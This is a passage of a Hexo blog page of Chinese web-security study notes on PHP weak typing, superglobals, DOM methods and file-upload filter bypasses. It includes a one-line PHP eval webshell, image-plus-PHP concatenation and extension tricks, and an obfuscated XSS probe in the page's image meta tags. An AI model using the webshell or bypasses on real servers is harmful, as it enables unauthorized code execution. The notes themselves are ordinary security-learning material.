@@ -1,0 +1,1146 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="web安全[TOC] 一、PHP详解及安全	### 1.PHP基本框架  123&lt;?php &#x2F;&#x2F;-- php代码 --?&gt;  2.PHP变量名规则·变量以$开头，后跟**_或者字母**，区分大小写。 3.弱类型安全12345678&#x27;&#x27;&#x3D;&#x3D;0&#x3D;&#x3D;false&#x3D;&#x3D;NULL&#x27;123&#x27;&#x3D;&#x3D;123&#x27;abc&#x27;&#x3D;&#x3D;0&#x27;123a&amp;#x">
+<meta property="og:type" content="article">
+<meta property="og:title" content="测试文章">
+<meta property="og:url" content="http://example.com/2025/09/11/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="web安全[TOC] 一、PHP详解及安全	### 1.PHP基本框架  123&lt;?php &#x2F;&#x2F;-- php代码 --?&gt;  2.PHP变量名规则·变量以$开头，后跟**_或者字母**，区分大小写。 3.弱类型安全12345678&#x27;&#x27;&#x3D;&#x3D;0&#x3D;&#x3D;false&#x3D;&#x3D;NULL&#x27;123&#x27;&#x3D;&#x3D;123&#x27;abc&#x27;&#x3D;&#x3D;0&#x27;123a&amp;#x">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/09/11/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/asdasd%3C/noscript%3E%3Cimg%20src=*%20%CE%BFnerr%CE%BFr=prompt(1)%3E">
+<meta property="article:published_time" content="2025-09-10T17:27:26.000Z">
+<meta property="article:modified_time" content="2025-09-10T17:29:34.032Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2025/09/11/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/asdasd%3C/noscript%3E%3Cimg%20src=*%20%CE%BFnerr%CE%BFr=prompt(1)%3E">
+  
+  
+  
+  <title>测试文章 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="测试文章"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-09-11 01:27" pubdate>
+          2025年9月11日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          22 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">测试文章</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="web安全"><a href="#web安全" class="headerlink" title="web安全"></a>web安全</h1><p>[TOC]</p>
+<h2 id="一、PHP详解及安全"><a href="#一、PHP详解及安全" class="headerlink" title="一、PHP详解及安全"></a>一、PHP详解及安全</h2><pre><code class="hljs">	### 1.PHP基本框架
+</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-comment">//-- php代码 --</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="2-PHP变量名规则"><a href="#2-PHP变量名规则" class="headerlink" title="2.PHP变量名规则"></a>2.PHP变量名规则</h3><p>·变量以$开头，后跟**_<strong>或者</strong>字母**，区分大小写。</p>
+<h3 id="3-弱类型安全"><a href="#3-弱类型安全" class="headerlink" title="3.弱类型安全"></a>3.弱类型安全</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-number">0</span>==<span class="hljs-literal">false</span>==<span class="hljs-literal">NULL</span><br><span class="hljs-string">&#x27;123&#x27;</span>==<span class="hljs-number">123</span><br><span class="hljs-string">&#x27;abc&#x27;</span>==<span class="hljs-number">0</span><br><span class="hljs-string">&#x27;123a&#x27;</span>==<span class="hljs-number">123</span><br><span class="hljs-string">&#x27;0x01&#x27;</span>==<span class="hljs-number">1</span><br><span class="hljs-string">&#x27;0e123456789&#x27;</span>==<span class="hljs-string">&#x27;0e987654321&#x27;</span><br>[<span class="hljs-literal">false</span>] ==[<span class="hljs-number">0</span>]==[<span class="hljs-literal">NULL</span>]==[<span class="hljs-string">&#x27;&#x27;</span>]<br><span class="hljs-literal">true</span> == <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="4-超级全局变量"><a href="#4-超级全局变量" class="headerlink" title="4.超级全局变量"></a>4.超级全局变量</h3><h5 id="GLOBAL"><a href="#GLOBAL" class="headerlink" title="$GLOBAL"></a>$GLOBAL</h5><p><code>$GLOBALS</code>是包含了全部变量的全局组合数组，变量名就是数组的键，在全局均可访问。</p>
+<h5 id="4-1-服务器数组"><a href="#4-1-服务器数组" class="headerlink" title="4.1.服务器数组"></a>4.1.服务器数组</h5><table>
+<thead>
+<tr>
+<th>元素&#x2F;代码</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>$_SERVER[‘PHP_SELF’]</strong></td>
+<td><strong>当前执行脚本的文件名</strong>，与 document root 有关。例如，在地址为 <a href="http://example.com/test.php/foo.bar">http://example.com/test.php/foo.bar</a> 的脚本中使用  $_SERVER[‘PHP_SELF’] 将得到 &#x2F;test.php&#x2F;foo.bar。<strong>FILE</strong>  常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果 PHP  以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。</td>
+</tr>
+<tr>
+<td>$_SERVER[‘GATEWAY_INTERFACE’]</td>
+<td>服务器使用的 CGI 规范的版本；例如，”CGI&#x2F;1.1”。</td>
+</tr>
+<tr>
+<td>$_SERVER[‘SERVER_ADDR’]</td>
+<td>当前运行脚本所在的服务器的 IP 地址。</td>
+</tr>
+<tr>
+<td>$_SERVER[‘SERVER_NAME’]</td>
+<td>当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。</td>
+</tr>
+<tr>
+<td>$_SERVER[‘SERVER_SOFTWARE’]</td>
+<td>服务器标识字符串，在响应请求时的头信息中给出。 (如：Apache&#x2F;2.2.24)</td>
+</tr>
+<tr>
+<td><strong>$_SERVER[‘SERVER_PROTOCOL’]</strong></td>
+<td><strong>请求页面时通信协议的名称和版本。例如，”HTTP&#x2F;1.0”。</strong></td>
+</tr>
+<tr>
+<td><strong>$_SERVER[‘REQUEST_METHOD’]</strong></td>
+<td><strong>访问页面使用的请求方法；例如，”GET”, “HEAD”，”POST”，”PUT”。</strong></td>
+</tr>
+<tr>
+<td>$_SERVER[‘REQUEST_TIME’]</td>
+<td>请求开始时的时间戳。从 PHP 5.1.0 起可用。 (如：1377687496)</td>
+</tr>
+<tr>
+<td>$_SERVER[‘QUERY_STRING’]</td>
+<td>query string（查询字符串），如果有的话，通过它进行页面访问。</td>
+</tr>
+<tr>
+<td>$_SERVER[‘HTTP_ACCEPT’]</td>
+<td>当前请求头中 Accept: 项的内容，如果存在的话。</td>
+</tr>
+<tr>
+<td>$_SERVER[‘HTTP_ACCEPT_CHARSET’]</td>
+<td>当前请求头中 Accept-Charset: 项的内容，如果存在的话。例如：”iso-8859-1,*,utf-8”。</td>
+</tr>
+<tr>
+<td>$_SERVER[‘HTTP_HOST’]</td>
+<td>当前请求头中 Host: 项的内容，如果存在的话。</td>
+</tr>
+<tr>
+<td>$_SERVER[‘HTTP_REFERER’]</td>
+<td>引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP_REFERER 的功能。简言之，该值并不可信。)</td>
+</tr>
+<tr>
+<td>$_SERVER[‘HTTPS’]</td>
+<td>如果脚本是通过 HTTPS 协议被访问，则被设为一个非空的值。</td>
+</tr>
+<tr>
+<td>$_SERVER[‘REMOTE_ADDR’]</td>
+<td>浏览当前页面的用户的 IP 地址。</td>
+</tr>
+<tr>
+<td>$_SERVER[‘REMOTE_HOST’]</td>
+<td>浏览当前页面的用户的主机名。DNS 反向解析不依赖于用户的 REMOTE_ADDR。</td>
+</tr>
+<tr>
+<td>$_SERVER[‘REMOTE_PORT’]</td>
+<td>用户机器上连接到 Web 服务器所使用的端口号。</td>
+</tr>
+<tr>
+<td>$_SERVER[‘SCRIPT_FILENAME’]</td>
+<td>当前执行脚本的绝对路径。</td>
+</tr>
+<tr>
+<td>$_SERVER[‘SERVER_ADMIN’]</td>
+<td>该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。如果脚本运行在一个虚拟主机上，则该值是那个虚拟主机的值。</td>
+</tr>
+<tr>
+<td>$_SERVER[‘SERVER_PORT’]</td>
+<td>Web 服务器使用的端口。默认值为 “80”。如果使用 SSL 安全连接，则这个值为用户设置的 HTTP 端口。</td>
+</tr>
+<tr>
+<td>$_SERVER[‘SERVER_SIGNATURE’]</td>
+<td>包含了服务器版本和虚拟主机名的字符串。</td>
+</tr>
+<tr>
+<td>$_SERVER[‘PATH_TRANSLATED’]</td>
+<td>当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。</td>
+</tr>
+<tr>
+<td>$_SERVER[‘SCRIPT_NAME’]</td>
+<td>包含当前脚本的路径。这在页面需要指向自己时非常有用。<strong>FILE</strong> 常量包含当前脚本(例如包含文件)的完整路径和文件名。</td>
+</tr>
+<tr>
+<td>$_SERVER[‘SCRIPT_URI’]</td>
+<td>URI 用来指定要访问的页面。例如 “&#x2F;index.html”。</td>
+</tr>
+</tbody></table>
+<h5 id="4-2-汇总"><a href="#4-2-汇总" class="headerlink" title="4.2.汇总"></a>4.2.汇总</h5><table>
+<thead>
+<tr>
+<th>超级全局变量</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>$_REQUEST</td>
+<td>用于收集HTML表单提交的数据。</td>
+</tr>
+<tr>
+<td>$_GET</td>
+<td>HTML form标签的属性method&#x3D;”get”时，$_GET可以收集URL中发送的数据。</td>
+</tr>
+<tr>
+<td>$_POST</td>
+<td>HTML form标签的属性method&#x3D;”post”时，$_POST可以收集表单中发送的数据。</td>
+</tr>
+<tr>
+<td>$_FILES</td>
+<td></td>
+</tr>
+<tr>
+<td>$_ENV</td>
+<td></td>
+</tr>
+<tr>
+<td>$_COOKIE</td>
+<td></td>
+</tr>
+<tr>
+<td>$_SESSION</td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 id="5-函数"><a href="#5-函数" class="headerlink" title="5.函数"></a>5.函数</h3><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>array()</td>
+<td>创建数组</td>
+</tr>
+<tr>
+<td>bool is_numeric ( mixed $var )</td>
+<td>检测变量是否为数字或数字字符串，注意，可以是16进制，字符串转16进制可以绕过。is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值。</td>
+</tr>
+<tr>
+<td>rand(<em>min,max</em>)</td>
+<td>生成随机整数</td>
+</tr>
+<tr>
+<td>sleep(seconds)</td>
+<td>延迟执行当前脚本若干秒</td>
+</tr>
+</tbody></table>
+<h3 id="6-PHP安全问题"><a href="#6-PHP安全问题" class="headerlink" title="6.PHP安全问题"></a>6.PHP安全问题</h3><h5 id="6-1-PHP版本后缀问题"><a href="#6-1-PHP版本后缀问题" class="headerlink" title="6.1.PHP版本后缀问题"></a>6.1.PHP版本后缀问题</h5><p><code>.php1 .php2 .php3</code>均可作为<code>php</code>后缀名，且后缀名不区分大小写，如果没有大小写过滤，<code>phP</code>也可作为后缀名。</p>
+<h5 id="6-2-PHP一句话木马"><a href="#6-2-PHP一句话木马" class="headerlink" title="6.2.PHP一句话木马"></a>6.2.PHP一句话木马</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;attack&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="6-3-CTF-弱类型比较"><a href="#6-3-CTF-弱类型比较" class="headerlink" title="6.3.CTF 弱类型比较"></a>6.3.CTF 弱类型比较</h5><p>哈希为0E开头的数字和以0e开头的数字进行弱类型比较会被科学计数法比较被PHP通认为是0</p>
+<p>md5密码的原理就是将一串密码进行哈希</p>
+<h2 id="二、JavaScript详解"><a href="#二、JavaScript详解" class="headerlink" title="二、JavaScript详解"></a>二、JavaScript详解</h2><h3 id="1-HTML-DOM-JavaScript"><a href="#1-HTML-DOM-JavaScript" class="headerlink" title="1.HTML DOM &amp; JavaScript"></a>1.HTML DOM &amp; JavaScript</h3><h5 id="1-1原理"><a href="#1-1原理" class="headerlink" title="1.1原理"></a>1.1原理</h5><p>DOM是html的标准对象模型和编程接口，可以对元素、属性、方法、事件进行操作。</p>
+<h5 id="1-2-查找-HTML-元素"><a href="#1-2-查找-HTML-元素" class="headerlink" title="1.2.查找 HTML 元素"></a>1.2.查找 HTML 元素</h5><table>
+<thead>
+<tr>
+<th>方法</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>document.getElementById(<em>id</em>)</td>
+<td>通过元素 id 来查找元素</td>
+</tr>
+<tr>
+<td>document.getElementsByTagName(<em>name</em>)</td>
+<td>通过标签名来查找元素</td>
+</tr>
+<tr>
+<td>document.getElementsByClassName(<em>name</em>)</td>
+<td>通过类名来查找元素</td>
+</tr>
+</tbody></table>
+<h5 id="1-3-改变-HTML-元素"><a href="#1-3-改变-HTML-元素" class="headerlink" title="1.3.改变 HTML 元素"></a>1.3.改变 HTML 元素</h5><table>
+<thead>
+<tr>
+<th>方法</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>element.innerHTML &#x3D;  <em>new html content</em></td>
+<td>改变元素的 inner HTML</td>
+</tr>
+<tr>
+<td>element.attribute &#x3D; <em>new value</em></td>
+<td>改变 HTML 元素的属性值</td>
+</tr>
+<tr>
+<td>element.setAttribute(<em>attribute</em>, <em>value</em>)</td>
+<td>改变 HTML 元素的属性值</td>
+</tr>
+<tr>
+<td>element.style.property &#x3D; <em>new style</em></td>
+<td>改变 HTML 元素的样式</td>
+</tr>
+</tbody></table>
+<h5 id="1-4-添加和删除元素"><a href="#1-4-添加和删除元素" class="headerlink" title="1.4.添加和删除元素"></a>1.4.添加和删除元素</h5><table>
+<thead>
+<tr>
+<th>方法</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>document.createElement(<em>element</em>)</td>
+<td>创建 HTML 元素</td>
+</tr>
+<tr>
+<td>document.removeChild(<em>element</em>)</td>
+<td>删除 HTML 元素</td>
+</tr>
+<tr>
+<td>document.appendChild(<em>element</em>)</td>
+<td>添加 HTML 元素</td>
+</tr>
+<tr>
+<td>document.replaceChild(<em>element</em>)</td>
+<td>替换 HTML 元素</td>
+</tr>
+<tr>
+<td>document.write(<em>text</em>)</td>
+<td>写入 HTML 输出流</td>
+</tr>
+</tbody></table>
+<h5 id="1-5-添加事件处理程序"><a href="#1-5-添加事件处理程序" class="headerlink" title="1.5.添加事件处理程序"></a>1.5.添加事件处理程序</h5><table>
+<thead>
+<tr>
+<th>方法</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>document.getElementById(id).onclick &#x3D; function(){<em>code</em>}</td>
+<td>向 onclick 事件添加事件处理程序</td>
+</tr>
+</tbody></table>
+<h5 id="1-6-查找-HTML-对象"><a href="#1-6-查找-HTML-对象" class="headerlink" title="1.6.查找 HTML 对象"></a>1.6.查找 HTML 对象</h5><p>首个 HTML DOM Level 1 (1998)，定义了 11 个 HTML 对象、对象集合和属性。它们在 HTML5 中仍然有效。</p>
+<p>后来，在 HTML DOM Level 3，加入了更多对象、集合和属性。</p>
+<table>
+<thead>
+<tr>
+<th>属性</th>
+<th>描述</th>
+<th>DOM版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>document.anchors</td>
+<td>返回拥有 name 属性的所有 <a> 元素。</td>
+<td>1</td>
+</tr>
+<tr>
+<td>document.applets</td>
+<td>返回所有 <applet> 元素（HTML5 不建议使用）</td>
+<td>1</td>
+</tr>
+<tr>
+<td>document.baseURI</td>
+<td>返回文档的绝对基准 URI</td>
+<td>3</td>
+</tr>
+<tr>
+<td>document.body</td>
+<td>返回 <body> 元素</td>
+<td>1</td>
+</tr>
+<tr>
+<td>document.cookie</td>
+<td>返回文档的 cookie</td>
+<td>1</td>
+</tr>
+<tr>
+<td>document.doctype</td>
+<td>返回文档的 doctype</td>
+<td>3</td>
+</tr>
+<tr>
+<td>document.documentElement</td>
+<td>返回 <html> 元素</td>
+<td>3</td>
+</tr>
+<tr>
+<td>document.documentMode</td>
+<td>返回浏览器使用的模式</td>
+<td>3</td>
+</tr>
+<tr>
+<td>document.documentURI</td>
+<td>返回文档的 URI</td>
+<td>3</td>
+</tr>
+<tr>
+<td>document.domain</td>
+<td>返回文档服务器的域名</td>
+<td>1</td>
+</tr>
+<tr>
+<td>document.domConfig</td>
+<td>废弃。返回 DOM 配置</td>
+<td>3</td>
+</tr>
+<tr>
+<td>document.embeds</td>
+<td>返回所有 <embed> 元素</td>
+<td>3</td>
+</tr>
+<tr>
+<td>document.forms</td>
+<td>返回所有 <form> 元素</td>
+<td>1</td>
+</tr>
+<tr>
+<td>document.head</td>
+<td>返回 <head> 元素</td>
+<td>3</td>
+</tr>
+<tr>
+<td>document.images</td>
+<td>返回所有 <img> 元素</td>
+<td>1</td>
+</tr>
+<tr>
+<td>document.implementation</td>
+<td>返回 DOM 实现</td>
+<td>3</td>
+</tr>
+<tr>
+<td>document.inputEncoding</td>
+<td>返回文档的编码（字符集）</td>
+<td>3</td>
+</tr>
+<tr>
+<td>document.lastModified</td>
+<td>返回文档更新的日期和时间</td>
+<td>3</td>
+</tr>
+<tr>
+<td>document.links</td>
+<td>返回拥有 href 属性的所有 <area> 和 <a> 元素</td>
+<td>1</td>
+</tr>
+<tr>
+<td>document.readyState</td>
+<td>返回文档的（加载）状态</td>
+<td>3</td>
+</tr>
+<tr>
+<td>document.referrer</td>
+<td>返回引用的 URI（链接文档）</td>
+<td>1</td>
+</tr>
+<tr>
+<td>document.scripts</td>
+<td>返回所有 <script> 元素</td>
+<td>3</td>
+</tr>
+<tr>
+<td>document.strictErrorChecking</td>
+<td>返回是否强制执行错误检查</td>
+<td>3</td>
+</tr>
+<tr>
+<td>document.title</td>
+<td>返回 <title> 元素</td>
+<td>1</td>
+</tr>
+<tr>
+<td>document.URL</td>
+<td>返回文档的完整 URL</td>
+<td>1</td>
+</tr>
+</tbody></table>
+<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="*文件上传漏洞"></a>*文件上传漏洞</h1><hr>
+<h3 id="1-javascript防御"><a href="#1-javascript防御" class="headerlink" title="1.javascript防御"></a>1.javascript防御</h3><p>由于前端的安全策略并不安全，JavaScript代码可以用开发人员工具禁用JavaScript代码，因此很少遇到。</p>
+<p>应对策略：通过前端禁用JavaScript或者修改JavaScript行内式代码绕过。</p>
+<h3 id="2-中间人攻击"><a href="#2-中间人攻击" class="headerlink" title="2.中间人攻击"></a>2.中间人攻击</h3><p>通过抓包手段更改文件后缀及文件类型的方式进行绕过，MIME攻击也可根据该方法绕过。</p>
+<h3 id="3-MIME检测"><a href="#3-MIME检测" class="headerlink" title="3.MIME检测"></a>3.MIME检测</h3><p>在请求头中通过**Content-Type：**来分析上传文件的数据类型，抓包修改即可。</p>
+<h3 id="4-后端文件格式检测"><a href="#4-后端文件格式检测" class="headerlink" title="4.后端文件格式检测"></a>4.后端文件格式检测</h3><p>后端函数判断文件类型，获取文件信息，有的*站点使用文件头来检测文件类型，可以在webshell前加入相对应的字节绕过检查，头字节表如下：</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>二进制值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JPG</td>
+<td>FF D8 FF E0 00 10 4A 46 49 46</td>
+</tr>
+<tr>
+<td>GIF</td>
+<td>47 49 46 38 39 61</td>
+</tr>
+<tr>
+<td>PNG</td>
+<td>89 50 4E 47</td>
+</tr>
+<tr>
+<td>TIF</td>
+<td>49 49 2A 00</td>
+</tr>
+<tr>
+<td>BMP</td>
+<td>42 4D</td>
+</tr>
+</tbody></table>
+<p>**应对策略：**upload.php.png</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">利用cmd（kali）命令copy /<span class="hljs-selector-tag">b</span> CA<span class="hljs-selector-class">.png</span> + tupian<span class="hljs-selector-class">.php</span> tupian.png<br></code></pre></td></tr></table></figure>
+
+<p>会生成新的图片upload，符合png格式，但是在图片后是php代码。</p>
+<h3 id="4-apache文件解析"><a href="#4-apache文件解析" class="headerlink" title="4.apache文件解析"></a>4.apache文件解析</h3><p>upload.php.xxx.zzz</p>
+<p>apache不认识.zzz 和.xxx，因此文件类型是.php。</p>
+<p>由于php读取文件名从后往前读，因此可以这样绕过。</p>
+<h3 id="过滤速查"><a href="#过滤速查" class="headerlink" title="过滤速查"></a>过滤速查</h3><table>
+<thead>
+<tr>
+<th>过滤类型</th>
+<th>应对策略</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>前端绕过</td>
+<td>brupsuite+禁用/修改Javascript代码</td>
+</tr>
+<tr>
+<td>黑名单绕过</td>
+<td>使用其他更多的后缀名：phtml、PHP3、jsp、cer</td>
+</tr>
+<tr>
+<td>后端大小写绕过</td>
+<td>phP</td>
+</tr>
+<tr>
+<td>后端双写绕过</td>
+<td>pphphp</td>
+</tr>
+<tr>
+<td>空格绕过</td>
+<td>.php+空格</td>
+</tr>
+<tr>
+<td>::$DATE</td>
+<td>隐藏文件流绕过</td>
+</tr>
+<tr>
+<td>MIME绕过</td>
+<td>brup抓包修改文件类型</td>
+</tr>
+<tr>
+<td>%00绕过</td>
+<td>.php%00a.jpg(0x00也可以)</td>
+</tr>
+<tr>
+<td>文件头绕过</td>
+<td>拼接图片</td>
+</tr>
+</tbody></table>
+<p><em>此处没有讨论条件竞争和解析绕过</em></p>
+<h3 id="4-条件竞争"><a href="#4-条件竞争" class="headerlink" title="4.条件竞争"></a>4.条件竞争</h3><p><strong>.htaccess基础知识重点内容</strong><br>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。<br>启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。<br>它里面有这样一段代码：AllowOverride None，如果我们把None改成All</p>
